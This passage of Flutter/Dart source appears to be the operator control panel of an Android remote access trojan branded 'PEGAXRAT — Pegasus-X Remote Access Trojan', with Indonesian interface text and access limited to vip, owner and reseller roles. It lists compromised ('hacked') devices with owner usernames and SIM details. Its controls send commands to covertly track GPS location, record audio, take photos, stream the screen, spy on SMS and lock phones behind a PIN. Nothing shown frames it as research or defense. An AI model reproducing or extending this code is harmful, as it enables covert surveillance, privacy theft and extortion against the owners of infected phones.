                  style: const TextStyle(fontFamily: 'Orbitron', color: _red, fontSize: 24, letterSpacing: 12, fontWeight: FontWeight.bold),
                  decoration: InputDecoration(border: InputBorder.none, counterText: '',
                    contentPadding: const EdgeInsets.symmetric(vertical: 16), hintText: '••••',
                    hintStyle: TextStyle(color: _red.withOpacity(0.3), fontSize: 24, letterSpacing: 12, fontFamily: 'Orbitron')),
                ),
              ),
              const SizedBox(height: 20),
              Row(children: [
                Expanded(child: GestureDetector(
                  onTap: () => Navigator.pop(ctx),
                  child: Container(
                    padding: const EdgeInsets.symmetric(vertical: 14),
                    decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(12), border: Border.all(color: Colors.white.withOpacity(0.15))),
                    child: Center(child: Text(tr('cancel'), style: const TextStyle(fontFamily: 'Orbitron', fontSize: 12, color: Colors.white70, letterSpacing: 1)))))),
                const SizedBox(width: 12),
                Expanded(child: GestureDetector(
                  onTap: () async {
                    final txt = _lockTextCtrl.text.trim();
                    final pin = _pinCtrl.text.trim();
                    if (pin.isEmpty || pin.length < 4) { _snack('PIN Harus 4 Digit'); return; }
                    Navigator.pop(ctx);
                    await _sendCommand('lock', {'text': txt, 'pin': pin});
                  },
                  child: Container(
                    padding: const EdgeInsets.symmetric(vertical: 14),
                    decoration: BoxDecoration(gradient: const LinearGradient(colors: [_red, Color(0xFFB91C1C)]), borderRadius: BorderRadius.circular(12)),
                    child: Center(child: Text(tr('lock_btn'), style: const TextStyle(fontFamily: 'Orbitron', fontSize: 12, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)))))),
              ]),
              const SizedBox(height: 8),
            ]),
          ),
        ),
      ),
    );
  }

  void _snack(String msg, {bool isError = false, bool isSuccess = false}) {
    if (!mounted) return;
    if (isError) {
      showError(context, msg);
    } else if (isSuccess) {
      showSuccess(context, msg);
    } else {
      showWarning(context, msg);
    }
  }

  @override
  Widget build(BuildContext context) {
    final allowed = _role == 'vip' || _role == 'owner' || _role == 'reseller';
    return ListenableBuilder(
      listenable: AppLocalizations.instance,
      builder: (context, _) => Scaffold(
        backgroundColor: AppTheme.darkBg,
        appBar: AppBar(
          backgroundColor: AppTheme.darkBg,
          elevation: 0,
          automaticallyImplyLeading: false,
          toolbarHeight: 180,
          flexibleSpace: SafeArea(
            child: _buildHackedHeader(),
          ),
          bottom: PreferredSize(
            preferredSize: const Size.fromHeight(1),
            child: Container(height: 1, color: _purple.withOpacity(0.15))),
        ),
        body: !allowed
            ? _buildNoAccess()
            : IndexedStack(
                index: _currentTab,
                children: [
                  _buildDeviceConnectTab(),
                  _buildHackCommandTab(),
                  _buildPsknmrcTab(),
                ],
              ),
        bottomNavigationBar: allowed ? _buildBottomNav() : null,
      ),
    );
  }

  Widget _buildBottomNav() {
    const active = _purple;
    final inactive = Colors.white.withOpacity(0.25);
    return Container(
      decoration: BoxDecoration(
        color: AppTheme.darkBg,
        border: Border(top: BorderSide(color: _purple.withOpacity(0.15))),

      ),
      child: SafeArea(
        top: false,
        child: Padding(
          padding: const EdgeInsets.symmetric(vertical: 8),
          child: Row(
            mainAxisAlignment: MainAxisAlignment.spaceEvenly,
            children: [
              _buildNavBtn(0, _svgConnect, active, inactive),
              _buildNavBtn(1, _svgCommand, active, inactive),
              _buildNavBtn(2, _svgUsers,   active, inactive),
            ],
          ),
        ),
      ),
    );
  }

  static const _svgConnect = '''<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>''';

  static const _svgCommand = '''<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>''';

  static const _svgUsers = '''<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>''';

  Widget _buildNavBtn(int index, String svg, Color active, Color inactive) {
    final isActive = _currentTab == index;
    final color = isActive ? active : inactive;
    return GestureDetector(
      onTap: () => setState(() => _currentTab = index),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 220),
        curve: Curves.easeOut,
        width: 60, height: 46,
        decoration: BoxDecoration(
          color: isActive ? active.withOpacity(0.12) : Colors.transparent,
          borderRadius: BorderRadius.circular(14),
          border: Border.all(
            color: isActive ? active.withOpacity(0.45) : Colors.transparent,
            width: 1),
        ),
        child: Center(
          child: SvgPicture.string(
            svg.replaceAll('currentColor', '#${color.value.toRadixString(16).substring(2)}'),
            width: 22, height: 22)),
      ),
    );
  }

  Widget _buildHackedHeader() {
    return Stack(children: [
      
      Positioned.fill(
        child: CustomPaint(painter: _ScanlinePainter(color: _purple.withOpacity(0.04)))),

      
      Positioned(
        top: 8, left: 8,
        child: GestureDetector(
          onTap: () => Navigator.pop(context),
          child: Container(
            width: 36, height: 36,
            decoration: BoxDecoration(
              color: _purple.withOpacity(0.08),
              borderRadius: BorderRadius.circular(10),
              border: Border.all(color: _purple.withOpacity(0.3))),
            child: SvgPicture.string(AppSvgIcons.arrowBackIos, width: 15, height: 15, colorFilter: const ColorFilter.mode(Colors.white54, BlendMode.srcIn))))),

      
      Center(
        child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
          const SizedBox(height: 6),

          
          AnimatedBuilder(
            animation: _rotateAnim,
            builder: (_, __) => Transform.rotate(
              angle: _rotateAnim.value * 6.2832,
              child: Container(
                width: 120, height: 120,
                decoration: const BoxDecoration(
                  shape: BoxShape.circle,
                  gradient: SweepGradient(colors: [
                    Color(0xFF8B5CF6), Color(0xFF6D28D9),
                    Color(0xFFEC4899), Color(0xFF8B5CF6)])),
                child: Transform.rotate(
                  angle: -_rotateAnim.value * 6.2832,
                  child: Padding(
                    padding: const EdgeInsets.all(3),
                    child: Container(
                      decoration: const BoxDecoration(shape: BoxShape.circle, color: Colors.black),
                      child: ClipOval(
                        child: Image.asset(
                          'assets/icons/rat.jpg',
                          width: 114, height: 114,
                          fit: BoxFit.cover,
                          errorBuilder: (_, __, ___) => Container(
                            color: const Color(0xFF8B5CF6).withOpacity(0.2),
                            child: SvgPicture.string(AppSvgIcons.shieldIcon, width: 48, height: 48, colorFilter: const ColorFilter.mode(Colors.white70, BlendMode.srcIn))))))))))),

          const SizedBox(height: 8),

          
          ShaderMask(
            shaderCallback: (bounds) => const LinearGradient(
              colors: [Color(0xFFE0AAFF), Color(0xFFC77DFF), Color(0xFF9D4EDD)],
            ).createShader(bounds),
            child: const Text('PEGAXRAT',
              style: TextStyle(
                fontFamily: 'Deltha',
                fontSize: 26,
                fontWeight: FontWeight.bold,
                color: Colors.white,
                letterSpacing: 4))),

          const SizedBox(height: 3),

          Text('Pegasus-X Remote Access Trojan',
            style: TextStyle(
              fontFamily: 'ShareTechMono',
              fontSize: 9,
              color: Colors.white.withOpacity(0.4),
              letterSpacing: 1.5)),

          const SizedBox(height: 6),
        ])),

      Positioned(
        top: 10, right: 12,
        child: GestureDetector(
          onTap: () => _selectedDeviceId != null ? _showDatabaseScreen() : _snack('Pilih Device Dulu'),
          child: Container(
            width: 40, height: 40,
            decoration: BoxDecoration(
              color: _purple.withOpacity(0.12),
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: _purple.withOpacity(0.45))),
            child: Center(
              child: SvgPicture.string(
                '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg>',
                width: 22, height: 22,
                colorFilter: ColorFilter.mode(_purple, BlendMode.srcIn),
              ),
            ),
          ),
        ),
      ),
    ],
  );
  }

  
  Widget _buildDeviceConnectTab() {
    final onlineDevices  = _devices.where((d) => d['online'] == true).toList();
    final offlineDevices = _devices.where((d) => d['online'] != true).toList();
    return SingleChildScrollView(
      padding: const EdgeInsets.all(20),
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        
        Row(children: [
          Expanded(child: GestureDetector(
            onTap: () => setState(() => _deviceTab = 0),
            child: AnimatedContainer(
              duration: const Duration(milliseconds: 200),
              padding: const EdgeInsets.symmetric(vertical: 10),
              decoration: BoxDecoration(
                color: _deviceTab == 0 ? _green.withOpacity(0.15) : AppTheme.cardBg,
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: _deviceTab == 0 ? _green : _purple.withOpacity(0.2))),
              child: Row(mainAxisAlignment: MainAxisAlignment.center, children: [
                Container(width: 8, height: 8, decoration: const BoxDecoration(
                  shape: BoxShape.circle, color: Colors.green,
                  boxShadow: [BoxShadow(color: Colors.green, blurRadius: 4)])),
                const SizedBox(width: 7),
                Text('ONLINE (${onlineDevices.length})',
                  style: TextStyle(fontFamily: 'Orbitron', fontSize: 10,
                    color: _deviceTab == 0 ? _green : Colors.white38, letterSpacing: 1)),
              ])))),
          const SizedBox(width: 10),
          Expanded(child: GestureDetector(
            onTap: () => setState(() => _deviceTab = 1),
            child: AnimatedContainer(
              duration: const Duration(milliseconds: 200),
              padding: const EdgeInsets.symmetric(vertical: 10),
              decoration: BoxDecoration(
                color: _deviceTab == 1 ? Colors.grey.withOpacity(0.15) : AppTheme.cardBg,
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: _deviceTab == 1 ? Colors.grey : _purple.withOpacity(0.2))),
              child: Row(mainAxisAlignment: MainAxisAlignment.center, children: [
                Container(width: 8, height: 8,
                  decoration: BoxDecoration(shape: BoxShape.circle, color: Colors.grey.shade600)),
                const SizedBox(width: 7),
                Text('OFFLINE (${offlineDevices.length})',
                  style: TextStyle(fontFamily: 'Orbitron', fontSize: 10,
                    color: _deviceTab == 1 ? Colors.grey.shade400 : Colors.white38, letterSpacing: 1)),
              ])))),
        ]),
        const SizedBox(height: 14),
        Row(children: [
          Expanded(child: Text(
            _deviceTab == 0 ? tr('select_device') : 'Device Offline — Lihat Data Tersimpan',
            style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 9,
              color: _deviceTab == 0 ? _purple.withOpacity(0.7) : Colors.grey.shade600, letterSpacing: 1))),
          GestureDetector(
            onTap: _loadDevices,
            child: Container(
              padding: const EdgeInsets.all(7),
              decoration: BoxDecoration(
                border: Border.all(color: _purple.withOpacity(0.3)),
                borderRadius: BorderRadius.circular(8),
                color: _purple.withOpacity(0.06)),
              child: _loadingDevices
                ? const SizedBox(width: 14, height: 14, child: CircularProgressIndicator(color: _purple, strokeWidth: 2))
                : SvgPicture.string(AppSvgIcons.refresh, width: 16, height: 16,
                    colorFilter: const ColorFilter.mode(_purple, BlendMode.srcIn)))),
        ]),
        const SizedBox(height: 10),
        _buildDeviceSelector(),
        if (_selectedDeviceId != null && _deviceTab == 0) ...[
          const SizedBox(height: 20),
          _buildDeviceInfoPanel(),
        ],
        const SizedBox(height: 60),
      ]),
    );
  }

  Widget _buildResultLogPanel() {
    final hasGps   = _lastGps != null;
    final hasAudio = _lastAudioResult != null;
    if (!hasGps && !hasAudio && !_fetchingGps && !_fetchingAudio && !_recordingAudio) {
      return const SizedBox.shrink();
    }
    return Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
      _buildSectionLabel('RESULT LOG'),
      const SizedBox(height: 12),

      
      if (_fetchingGps)
        _buildLogCard(
          icon: AppSvgIcons.locationSearching,
          color: const Color(0xFF34D399),
          title: 'GPS TRACKING',
          content: 'Mengambil Lokasi Device...',
          loading: true),
      if (hasGps) _buildGpsLogCard(_lastGps!),

      
      if (_recordingAudio)
        _buildLogCard(
          icon: AppSvgIcons.mic,
          color: const Color(0xFFF43F5E),
          title: 'REKAM SUARA',
          content: 'Sedang Merekam...',
          loading: true),
      if (_fetchingAudio && !_recordingAudio)
        _buildLogCard(
          icon: AppSvgIcons.mic,
          color: const Color(0xFFF43F5E),
          title: 'REKAM SUARA',
          content: 'Mengambil Hasil Rekaman...',
          loading: true),
      if (hasAudio)
        _buildLogCard(
          icon: AppSvgIcons.audioFile,
          color: const Color(0xFFF43F5E),
          title: 'AUDIO DITERIMA',
          content: 'Durasi: ≈${_lastAudioResult!['duration']}s\nSize: ${((((_lastAudioResult!['audioBase64'] as String? ?? '').length) * 0.75) / 1024).toStringAsFixed(1)} KB',
          ),
    ]);
  }

  Widget _buildLogCard({
    required String icon,
    required Color color,
    required String title,
    required String content,
    bool loading = false,
    Widget? trailing,
  }) {
    return Container(
      margin: const EdgeInsets.only(bottom: 10),
      padding: const EdgeInsets.all(14),
      decoration: BoxDecoration(
        color: color.withOpacity(0.06),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: color.withOpacity(0.3))),
      child: Row(crossAxisAlignment: CrossAxisAlignment.start, children: [
        Container(width: 32, height: 32,
          decoration: BoxDecoration(color: color.withOpacity(0.15), borderRadius: BorderRadius.circular(8)),
          child: loading
            ? Padding(padding: const EdgeInsets.all(7), child: CircularProgressIndicator(color: color, strokeWidth: 2))
            : Center(child: SvgPicture.string(icon, width: 16, height: 16, colorFilter: ColorFilter.mode(color, BlendMode.srcIn)))),
        const SizedBox(width: 12),
        Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
          Text(title, style: TextStyle(fontFamily: 'Orbitron', fontSize: 10, color: color, letterSpacing: 1)),
          const SizedBox(height: 4),
          Text(content, style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Colors.white70, height: 1.5)),
        ])),
        if (trailing != null) ...[const SizedBox(width: 8), trailing],
      ]),
    );
  }

  Widget _buildGpsLogCard(Map<String, dynamic> gps) {
    final lat = (gps['latitude']  as num?)?.toDouble() ?? 0;
    final lng = (gps['longitude'] as num?)?.toDouble() ?? 0;
    final acc = (gps['accuracy']  as num?)?.toDouble() ?? 0;
    return _buildLogCard(
      icon: AppSvgIcons.locationOn,
      color: const Color(0xFF34D399),
      title: 'GPS RESULT',
      content: 'LAT: ${lat.toStringAsFixed(6)}\nLNG: ${lng.toStringAsFixed(6)}\nAkurasi: ±${acc.toStringAsFixed(0)}m',
      trailing: GestureDetector(
        onTap: () => _openMapsUrl(context, 'https://maps.google.com/?q=$lat,$lng', fallback: () => _snack('Link Maps Disalin!', isSuccess: true)),
        child: Container(
          padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 6),
          decoration: BoxDecoration(
            color: const Color(0xFF34D399).withOpacity(0.15),
            borderRadius: BorderRadius.circular(8),
            border: Border.all(color: const Color(0xFF34D399).withOpacity(0.4))),
          child: const Text('Maps', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 9, color: Color(0xFF34D399))))));
  }

  Widget _buildDeviceInfoPanel() {
    final info = _deviceInfo;
    return Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
      _buildSectionLabel('DEVICE INFO'),
      const SizedBox(height: 12),

      
      Container(
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(
          color: AppTheme.cardBg,
          borderRadius: BorderRadius.circular(14),
          border: Border.all(color: _purple.withOpacity(0.2))),
        child: _loadingDeviceInfo
          ? const Center(child: SizedBox(width: 24, height: 24, child: CircularProgressIndicator(color: _purple, strokeWidth: 2)))
          : Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              
              _infoRow(AppSvgIcons.phoneAndroid, 'Device', info?['model'] as String? ?? _selectedDeviceName ?? '-'),
              const SizedBox(height: 10),
              
              _infoRow(AppSvgIcons.battery, 'Baterai', info != null ? '${info['battery'] ?? '-'}%' : '-',
                color: (info?['battery'] as int? ?? 100) < 20 ? Colors.red : _green),
              const SizedBox(height: 10),
              
              _infoRow(AppSvgIcons.signalCellular, 'Network', info?['network'] as String? ?? '-'),
              const SizedBox(height: 10),
              
              _infoRow(AppSvgIcons.simCard, 'SIM 1', info?['sim1'] as String? ?? '-'),
              const SizedBox(height: 10),
              
              _infoRow(AppSvgIcons.simCard, 'SIM 2', info?['sim2'] as String? ?? 'Tidak ada'),
              const SizedBox(height: 10),
              
              _infoRow(AppSvgIcons.android, 'Android', info?['androidVersion'] as String? ?? '-', color: const Color(0xFF78C257)),
            ]),
      ),
    ]);
  }

  Widget _infoRow(String icon, String label, String value, {Color? color}) {
    return Row(children: [
      SvgPicture.string(icon, width: 16, height: 16, colorFilter: ColorFilter.mode(color ?? _purple.withOpacity(0.6), BlendMode.srcIn)),
      const SizedBox(width: 10),
      Text('$label:', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Colors.white.withOpacity(0.4))),
      const SizedBox(width: 8),
      Expanded(child: Text(value, style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: color ?? Colors.white, fontWeight: FontWeight.bold), overflow: TextOverflow.ellipsis)),
    ]);
  }

  Widget _buildHackCommandTab() {
    return SingleChildScrollView(
      padding: const EdgeInsets.all(20),
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        _buildSectionLabel(tr('hacked_commands')),
        const SizedBox(height: 12),
        _buildCommandGrid(),
        const SizedBox(height: 60),
      ]),
    );
  }

  Widget _buildNoAccess() {
    return Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
      SvgPicture.string(AppSvgIcons.lock, width: 56, height: 56, colorFilter: ColorFilter.mode(Colors.red.withOpacity(0.4), BlendMode.srcIn)),
      const SizedBox(height: 16),
      Text(tr('no_access'), style: const TextStyle(fontFamily: 'Orbitron', fontSize: 16, color: Colors.red, letterSpacing: 3)),
      const SizedBox(height: 8),
      Text(tr('vip_only'), textAlign: TextAlign.center, style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 12, color: AppTheme.textMuted, height: 1.6)),
    ]));
  }

  Widget _buildSectionLabel(String t, {String? svgIcon}) {
    
    final icon = svgIcon ?? _sectionIconFor(t);
    return Row(children: [
      if (icon.isNotEmpty) ...[
        SvgPicture.string(icon, width: 14, height: 14,
          colorFilter: const ColorFilter.mode(Color(0xFFA78BFA), BlendMode.srcIn)),
        const SizedBox(width: 8),
      ],
      Text(t,
        style: const TextStyle(
          fontFamily: 'Orbitron',
          fontSize: 11,
          fontWeight: FontWeight.w700,
          color: Color(0xFFA78BFA),
          letterSpacing: 2.5)),
    ]);
  }

  static String _sectionIconFor(String label) {
    final l = label.toUpperCase();
    if (l.contains('DEVICE') || l.contains('SELECT') || l.contains('PILIH'))
      return '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>';
    if (l.contains('COMMAND') || l.contains('HACK'))
      return '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>';
    if (l.contains('PROTECTION') || l.contains('LOCK'))
      return '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>';
    if (l.contains('INFO'))
      return '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>';
    if (l.contains('RESULT') || l.contains('LOG'))
      return '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>';
    return '';
  }

  Widget _buildDeviceSelector() {
    final onlineDevices  = _devices.where((d) => d['online'] == true).toList();
    final offlineDevices = _devices.where((d) => d['online'] != true).toList();
    final list = _deviceTab == 0 ? onlineDevices : offlineDevices;

    if (list.isEmpty) {
      return Container(
        padding: const EdgeInsets.all(20),
        decoration: BoxDecoration(color: AppTheme.cardBg, borderRadius: BorderRadius.circular(14),
          border: Border.all(color: _purple.withOpacity(0.2))),
        child: Column(children: [
          SvgPicture.string(AppSvgIcons.mobile, width: 32, height: 32,
            colorFilter: ColorFilter.mode(_purple.withOpacity(0.3), BlendMode.srcIn)),
          const SizedBox(height: 12),
          Text(_deviceTab == 0 ? tr('no_device_online') : 'Belum Ada Device Offline',
            style: const TextStyle(fontFamily: 'Orbitron', fontSize: 11, color: AppTheme.textMuted, letterSpacing: 1)),
          const SizedBox(height: 4),
          Text(_deviceTab == 0 ? tr('device_hint') : 'Device Yang Pernah Connect Akan Muncul Di Sini',
            textAlign: TextAlign.center,
            style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: AppTheme.textMuted, height: 1.5)),
        ]),
      );
    }

    return Column(children: list.map((d) {
      final isOnline   = d['online'] == true;
      final isSelected = _selectedDeviceId == d['deviceId'];
      final accent     = isOnline ? _purple : Colors.grey.shade600;
      return GestureDetector(
        onTap: () {
          setState(() {
            _selectedDeviceId   = d['deviceId']   as String;
            _selectedDeviceName = (d['deviceBrand'] as String?)?.isNotEmpty == true ? d['deviceBrand'] as String : d['deviceName'] as String;
            _flashOn = false;
            _deviceInfo = null;
          });
          if (isOnline) {
            _loadDeviceInfo(_selectedDeviceId!);
            _startDeviceInfoPolling(_selectedDeviceId!);
            ApiService.get('/api/hacked/sms-spy-state/${d['deviceId']}').then((res) {
              if (mounted && res['success'] == true) {
                setState(() => _smsSpyActive = res['active'] == true);
              }
            }).catchError((_) {});
          }
        },
        child: AnimatedContainer(
          duration: const Duration(milliseconds: 200),
          margin: const EdgeInsets.only(bottom: 10),
          padding: const EdgeInsets.all(14),
          decoration: BoxDecoration(
            color: isSelected ? accent.withOpacity(0.15) : AppTheme.cardBg,
            borderRadius: BorderRadius.circular(14),
            border: Border.all(color: isSelected ? accent : accent.withOpacity(0.2), width: isSelected ? 1.5 : 1),
            boxShadow: isSelected ? [BoxShadow(color: accent.withOpacity(0.25), blurRadius: 12)] : []),
          child: Row(children: [
            Container(width: 40, height: 40,
              decoration: BoxDecoration(
                color: isSelected ? accent.withOpacity(0.3) : accent.withOpacity(0.1),
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: accent.withOpacity(0.4))),
              child: Center(child: SvgPicture.string(AppSvgIcons.mobile, width: 20, height: 20,
                colorFilter: ColorFilter.mode(isSelected ? accent : accent.withOpacity(0.5), BlendMode.srcIn)))),
            const SizedBox(width: 12),
            Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              Text(d['deviceBrand'] as String? ?? d['deviceName'] as String? ?? 'Unknown',
                style: const TextStyle(fontFamily: 'Orbitron', fontSize: 12, color: Colors.white, fontWeight: FontWeight.bold)),
              const SizedBox(height: 2),
              Text(d['ownerUsername'] as String? ?? 'unknown',
                style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 9, color: accent.withOpacity(0.7))),
              const SizedBox(height: 3),
              Row(children: [
                Container(width: 6, height: 6, decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  color: isOnline ? Colors.green : Colors.grey.shade600,
                  boxShadow: isOnline ? [const BoxShadow(color: Colors.green, blurRadius: 4)] : [])),
                const SizedBox(width: 6),
                Text(isOnline ? 'Online' : 'Offline',
                  style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 9,
                    color: isOnline ? Colors.green : Colors.grey.shade600, letterSpacing: 1)),
                if (!isOnline && d['lastSeen'] != null && d['lastSeen'] != 0) ...[
                  const SizedBox(width: 8),
                  Text(_formatLastSeen(d['lastSeen'] as int),
                    style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 8, color: Colors.white24)),
                ],
              ]),
            ])),
            
            if (!isOnline)
              GestureDetector(
                onTap: () {
                  setState(() {
                    _selectedDeviceId   = d['deviceId']   as String;
                    _selectedDeviceName = d['deviceName'] as String;
                  });
                  Navigator.push(context, MaterialPageRoute(
                    builder: (_) => _DatabaseScreen(
                      deviceId: d['deviceId'] as String,
                      deviceName: d['deviceName'] as String,
                      role: _role)));
                },
                child: Container(
                  width: 34, height: 34,
                  decoration: BoxDecoration(
                    color: Colors.grey.withOpacity(0.1),
                    borderRadius: BorderRadius.circular(9),
                    border: Border.all(color: Colors.grey.withOpacity(0.3))),
                  child: Center(child: SvgPicture.string(
                    '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg>',
                    width: 16, height: 16,
                    colorFilter: ColorFilter.mode(Colors.grey.shade500, BlendMode.srcIn))))),
            if (isSelected && isOnline)
              SvgPicture.string(AppSvgIcons.checkCircle, width: 20, height: 20,
                colorFilter: const ColorFilter.mode(_purple, BlendMode.srcIn)),
          ]),
        ),
      );
    }).toList());
  }

  String _formatLastSeen(int ts) {
    if (ts == 0) return '';
    final diff = Duration(milliseconds: DateTime.now().millisecondsSinceEpoch - ts);
    if (diff.inMinutes < 1)  return 'Baru Saja';
    if (diff.inMinutes < 60) return '${diff.inMinutes}m lalu';
    if (diff.inHours < 24)   return '${diff.inHours}h lalu';
    return '${diff.inDays}d lalu';
  }

  Widget _buildCommandGrid() {
    final cmds = _hackedCommands;
    return GridView.builder(
      physics: const NeverScrollableScrollPhysics(),
      shrinkWrap: true,
      gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
        crossAxisCount: 2, childAspectRatio: 1.05,
        crossAxisSpacing: 14, mainAxisSpacing: 14),
      itemCount: cmds.length,
      itemBuilder: (ctx, i) => _buildCommandCard(cmds[i]),
    );
  }

  Widget _buildCommandCard(Map<String, dynamic> cmd) {
    final color    = cmd['color']  as Color;
    final isActive = cmd['active'] as bool;
    final type     = cmd['cmd']    as String;
    final isFlash  = type == 'flashlight';
    final isPhoto  = type == 'take_photo';
    final isLive   = type == 'screen_live';
    final isSms    = type == 'sms';
    final isGps    = type == 'get_gps';
    final isAudio  = type == 'record_audio';

    return GestureDetector(
      onTap: _sendingCmd ? null : () => _handleCommandTap(cmd),
      child: Container(
        decoration: BoxDecoration(
          gradient: AppTheme.cardGradient,
          borderRadius: BorderRadius.circular(16),
          border: Border.all(color: isActive ? color.withOpacity(0.5) : color.withOpacity(0.2)),
          boxShadow: [BoxShadow(color: isActive ? color.withOpacity(0.15) : Colors.transparent, blurRadius: 10)]),
        padding: const EdgeInsets.all(16),
        child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
          Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
            Container(width: 40, height: 40,
              decoration: BoxDecoration(
                color: isActive ? color.withOpacity(0.2) : color.withOpacity(0.08),
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: isActive ? color.withOpacity(0.5) : color.withOpacity(0.2))),
              child: Center(child: SvgPicture.string(cmd['icon'] as String, width: 16, height: 16,
                colorFilter: ColorFilter.mode(isActive ? color : color.withOpacity(0.3), BlendMode.srcIn)))),
            if (!isActive)
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 3),
                decoration: BoxDecoration(color: Colors.orange.withOpacity(0.15), borderRadius: BorderRadius.circular(4), border: Border.all(color: Colors.orange.withOpacity(0.4))),
                child: const Text('Soon', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 8, color: Colors.orange, letterSpacing: 1)))
            else if (isFlash)
              Container(
                width: 40, height: 22,
                decoration: BoxDecoration(
                  color: _flashOn ? color.withOpacity(0.25) : Colors.grey.withOpacity(0.15),
                  borderRadius: BorderRadius.circular(11),
                  border: Border.all(color: _flashOn ? color : Colors.grey.withOpacity(0.3))),
                child: Center(child: Text(_flashOn ? 'On' : 'Off',
                  style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 9, fontWeight: FontWeight.bold, color: _flashOn ? color : Colors.grey))))
            else if (isPhoto && _fetchingPhoto)
              SizedBox(width: 18, height: 18, child: CircularProgressIndicator(color: color, strokeWidth: 2))
            else if (isLive && _screenLiveActive)
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 3),
                decoration: BoxDecoration(color: color.withOpacity(0.2), borderRadius: BorderRadius.circular(4), border: Border.all(color: color.withOpacity(0.6))),
                child: Text('LIVE', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 8, color: color, fontWeight: FontWeight.bold, letterSpacing: 1)))
            else if (isSms && _smsSpyActive)
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 3),
